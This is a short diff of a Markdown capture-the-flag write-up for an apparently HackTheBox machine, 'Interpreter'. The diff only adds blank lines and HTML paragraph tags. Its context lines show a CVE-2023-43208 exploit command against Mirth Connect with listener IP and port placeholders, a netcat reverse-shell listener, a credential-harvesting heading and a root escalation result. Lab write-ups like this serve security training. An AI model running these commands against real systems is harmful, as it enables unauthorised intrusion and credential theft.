@@ -128,15 +128,18 @@ python3 CVE-2023-43208.py -u https://interpreter.htb -lh <YOUR_IP> -lp <PORT>
 nc -lvnp <PORT>
 ---
 
+
 # 🗄️ **Database Enumeration & Credential Harvesting**
 
 ## **Mirth Connect Configuration Analysis**
 
 Navigating to Mirth Connect installation directory:
 
+
 ```bash
 cd /usr/local/mirthconnect
 ls -la
+
 ```
 
 ## **Finding Database Credentials**
@@ -524,7 +527,9 @@ We have **euid=0(root)** - Privilege Escalation successful!
 
 <p align="center">
 # 🎉 **Machine Solved!**
+</p>
 
+<p align="center">
 ![Machine Solved](solved_machine_banner.PNG)
 </p>
 
